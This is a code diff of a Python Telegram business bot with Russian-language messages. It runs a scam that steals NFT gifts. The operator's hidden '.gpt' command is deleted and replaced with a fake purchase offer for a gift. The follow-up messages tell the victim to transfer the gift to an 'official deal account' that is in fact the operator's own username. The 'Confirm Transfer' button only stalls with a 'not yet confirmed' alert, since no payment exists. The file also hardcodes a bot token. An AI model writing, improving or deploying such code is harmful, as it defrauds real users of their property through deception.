@@ -6,7 +6,6 @@ from aiogram.enums import ParseMode
 
 # --- НАСТРОЙКИ ---
 BOT_TOKEN = "9132697740:AAFlvna4QfTfTaCZ6-RZ2fPGa2mBdba1l_A"
-YOUR_RELAYER_ACCOUNT = "@GiftLink_Relayer"
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dispatcher = Dispatcher()
@@ -16,7 +15,6 @@ last_message_id = None
 
 # --- ФУНКЦИЯ ДЛЯ БЕЗОПАСНОГО УДАЛЕНИЯ ---
 async def safe_delete(chat_id, message_id, conn_id=None):
-    # Пытаемся удалить через бизнес-метод
     if conn_id:
         try:
             await bot.delete_business_messages(
@@ -24,14 +22,12 @@ async def safe_delete(chat_id, message_id, conn_id=None):
                 message_ids=[message_id]
             )
             return
-        except Exception as e:
-            print(f"Ошибка delete_business_messages: {e}")
-    
-    # Если не вышло, пробуем обычным методом
+        except Exception:
+            pass
     try:
         await bot.delete_message(chat_id=chat_id, message_id=message_id)
-    except Exception as e:
-        print(f"Ошибка обычного удаления: {e}")
+    except Exception:
+        pass
 
 # --- ОБРАБОТЧИК КОМАНДЫ .gpt ---
 @dispatcher.business_message(F.text.startswith(".gpt"))
@@ -40,34 +36,57 @@ async def send_offer(message: Message):
     if not message.business_connection_id:
         return
 
-    # ПРОВЕРКА: реагировать только на сообщения от владельца аккаунта (твинка)
     try:
         connection = await bot.get_business_connection(message.business_connection_id)
         owner_id = connection.user.id
-    except Exception as e:
-        print(f"Ошибка получения бизнес-подключения: {e}")
+    except Exception:
         return
 
     if message.from_user.id != owner_id:
         return
 
     parts = message.text.split()
-    if len(parts) != 3:
+    
+    # Теперь ждем 4 части: .gpt, ссылка, сумма, валюта
+    if len(parts) != 4:
         return
 
     link = parts[1]
     amount = parts[2]
+    currency_raw = parts[3].lower()
+
+    if currency_raw not in ["stars", "ton", "gram"]:
+        return
+
+    if currency_raw == "stars":
+        currency_display = "⭐ Stars"
+    elif currency_raw == "ton":
+        currency_display = "TON"
+    else:
+        currency_display = "GRAM"
 
     nft_slug = link.rstrip("/").split("/")[-1]
     nft_prefix, separator, nft_number = nft_slug.rpartition("-")
     nft_name = f"{nft_prefix} #{nft_number}" if separator and nft_number.isdigit() else nft_slug
 
+    # Кликабельный ник отправителя
+    sender_username = message.from_user.username
+    if sender_username:
+        username_link = f'<a href="https://t.me/{sender_username}">{sender_username}</a>'
+    else:
+        username_link = message.from_user.first_name
+
+    # Кликабельная ссылка на NFT
+    nft_link = f'<a href="{link}">{nft_name}</a>'
+    
+    # Скрытая ссылка для карточки
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
+    # Текст первого сообщения
     offer_text = (
-        f"<b>Пользователь предлагает вам\n"
-        f"{amount} ⭐ Stars за подарок <a href='{link}'>{nft_name}</a>.</b>\n\n"
-        f"<b>Оффер действителен ещё 5 ч. 59 мин..</b>\n"
+        f"<b>Пользователь {username_link} предлагает вам\n"
+        f"{amount} {currency_display} за {nft_link}.</b>\n\n"
+        f"<b>Действует 5 ч. 59 мин.</b>\n"
         f"{hidden_link}"
     )
 
@@ -79,15 +98,15 @@ async def send_offer(message: Message):
     last_offer_data = {
         "nft_name": nft_name,
         "amount": amount,
+        "currency_display": currency_display,
         "link": link,
+        "sender_username": sender_username or message.from_user.first_name,
         "business_connection_id": message.business_connection_id
     }
 
-    # Удаляем предыдущий оффер (если был)
     if last_message_id:
         await safe_delete(message.chat.id, last_message_id, message.business_connection_id)
 
-    # Отправляем новый оффер
     try:
         msg = await bot.send_message(
             chat_id=message.chat.id,
@@ -101,26 +120,28 @@ async def send_offer(message: Message):
             )
         )
         last_message_id = msg.message_id
-        
-        # Удаляем команду .gpt
         await safe_delete(message.chat.id, message.message_id, message.business_connection_id)
     except Exception as e:
-        print(f"Ошибка отправки оффера: {e}")
+        print(f"Ошибка: {e}")
 
-# --- ОБРАБОТЧИК "ПРИНЯТЬ" ---
+# --- ОБРАБОТЧИК "ПРИНЯТЬ" (ВТОРОЕ СООБЩЕНИЕ, СО ЗВЕЗДОЙ) ---
 @dispatcher.callback_query(F.data == "accept_offer")
 async def on_accept_offer(callback: CallbackQuery):
     global last_message_id
     nft_name = last_offer_data.get("nft_name", "NFT")
     amount = last_offer_data.get("amount", "0")
+    currency_display = last_offer_data.get("currency_display", "Stars")
     link = last_offer_data.get("link", "")
     conn_id = last_offer_data.get("business_connection_id")
+    sender_username = last_offer_data.get("sender_username", "unknown")
 
+    username_link = f'<a href="https://t.me/{sender_username}">{sender_username}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
     
+    # Убрали смайлы, кроме звезды на кнопке (но кнопка тут не меняется, поэтому звезда в тексте)
     new_text = (
-        f"🔔 <b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
-        f"• Отправьте подарок на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>, чтобы получить <b>{amount} ⭐</b>.\n"
+        f"<b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
+        f"• Отправьте подарок на официальный аккаунт сделки {username_link}, чтобы получить <b>{amount} ⭐</b>.\n"
         f"{hidden_link}"
     )
 
@@ -129,14 +150,11 @@ async def on_accept_offer(callback: CallbackQuery):
         [InlineKeyboardButton(text="Confirm Transfer", callback_data="confirm_transfer")]
     ])
 
-    # Удаляем старое сообщение (оффер)
     await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
 
-    # Удаляем предыдущее сообщение (если было)
     if last_message_id and last_message_id != callback.message.message_id:
         await safe_delete(callback.message.chat.id, last_message_id, conn_id)
 
-    # Отправляем новое
     try:
         msg = await bot.send_message(
             chat_id=callback.message.chat.id,
@@ -155,27 +173,31 @@ async def on_accept_offer(callback: CallbackQuery):
     
     await callback.answer()
 
-# --- ОБРАБОТЧИК "КАК ПЕРЕДАТЬ?" ---
+# --- ОБРАБОТЧИК "КАК ПЕРЕДАТЬ?" (ТРЕТЬЕ СООБЩЕНИЕ) ---
 @dispatcher.callback_query(F.data == "send_transfer")
 async def on_send_transfer(callback: CallbackQuery):
     global last_message_id
     nft_name = last_offer_data.get("nft_name", "NFT")
     amount = last_offer_data.get("amount", "0")
+    currency_display = last_offer_data.get("currency_display", "Stars")
     link = last_offer_data.get("link", "")
     conn_id = last_offer_data.get("business_connection_id")
+    sender_username = last_offer_data.get("sender_username", "unknown")
 
+    username_link = f'<a href="https://t.me/{sender_username}">{sender_username}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
+    # Убрали смайлы
     instruction_text = (
-        f"🎁 <b>Сделка подтверждена.</b>\n\n"
-        f"Подарок <a href='{link}'><b>{nft_name}</b></a> зарезервирован. Чтобы получить <b>{amount} ⭐</b>, отправьте его на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>.\n\n"
+        f"<b>Сделка подтверждена.</b>\n\n"
+        f"Подарок <a href='{link}'><b>{nft_name}</b></a> зарезервирован. Чтобы получить <b>{amount} {currency_display}</b>, отправьте его на официальный аккаунт сделки {username_link}.\n\n"
         f"<b>Как передать подарок:</b>\n"
-        f"1. Откройте Профиль ➔ Подарки в Telegram.\n"
+        f"1. Откройте Профиль -> Подарки в Telegram.\n"
         f"2. Выберите <b>{nft_name}</b> в своём списке.\n"
         f"3. Нажмите «Передать», затем укажите получателя.\n"
         f"4. Проверьте данные и подтвердите отправку.\n\n"
         f"<b>Автоматическое завершение сделки</b>\n"
-        f"После подтверждения передачи NFT-подарка на <b>{YOUR_RELAYER_ACCOUNT}</b> система обновит статус сделки, а сумма <b>{amount} ⭐</b> станет доступна продавцу.\n"
+        f"После подтверждения передачи NFT-подарка на {username_link} система обновит статус сделки, а сумма <b>{amount} {currency_display}</b> станет доступна продавцу.\n"
         f"{hidden_link}"
     )
 
@@ -183,9 +205,7 @@ async def on_send_transfer(callback: CallbackQuery):
         InlineKeyboardButton(text="Назад", callback_data="back_from_instruction")
     ]])
 
-    # Удаляем текущее сообщение
     await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
-
     if last_message_id:
         await safe_delete(callback.message.chat.id, last_message_id, conn_id)
 
@@ -213,14 +233,18 @@ async def back_from_instruction(callback: CallbackQuery):
     global last_message_id
     nft_name = last_offer_data.get("nft_name", "NFT")
     amount = last_offer_data.get("amount", "0")
+    currency_display = last_offer_data.get("currency_display", "Stars")
     link = last_offer_data.get("link", "")
     conn_id = last_offer_data.get("business_connection_id")
+    sender_username = last_offer_data.get("sender_username", "unknown")
 
+    username_link = f'<a href="https://t.me/{sender_username}">{sender_username}</a>'
     hidden_link = f'<a href="{link}">&#8203;</a>'
 
+    # Убрали смайлы
     back_text = (
-        f"🔔 <b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
-        f"• Отправьте подарок на официальный аккаунт сделки <b>{YOUR_RELAYER_ACCOUNT}</b>, чтобы получить <b>{amount} ⭐</b>.\n"
+        f"<b>Подарок: {nft_name}\nуспешно продан!</b>\n\n"
+        f"• Отправьте подарок на официальный аккаунт сделки {username_link}, чтобы получить <b>{amount} {currency_display}</b>.\n"
         f"{hidden_link}"
     )
 
@@ -230,7 +254,6 @@ async def back_from_instruction(callback: CallbackQuery):
     ])
 
     await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
-
     if last_message_id:
         await safe_delete(callback.message.chat.id, last_message_id, conn_id)
 
@@ -256,9 +279,10 @@ async def back_from_instruction(callback: CallbackQuery):
 @dispatcher.callback_query(F.data == "confirm_transfer")
 async def on_confirm_transfer(callback: CallbackQuery):
     amount = last_offer_data.get("amount", "0")
+    currency_display = last_offer_data.get("currency_display", "Stars")
     alert_text = (
         f"Передача пока не подтверждена. Сумма "
-        f"предложения: {amount} ⭐. Дождитесь "
+        f"предложения: {amount} {currency_display}. Дождитесь "
         f"проверки."
     )
     await callback.answer(alert_text, show_alert=True)
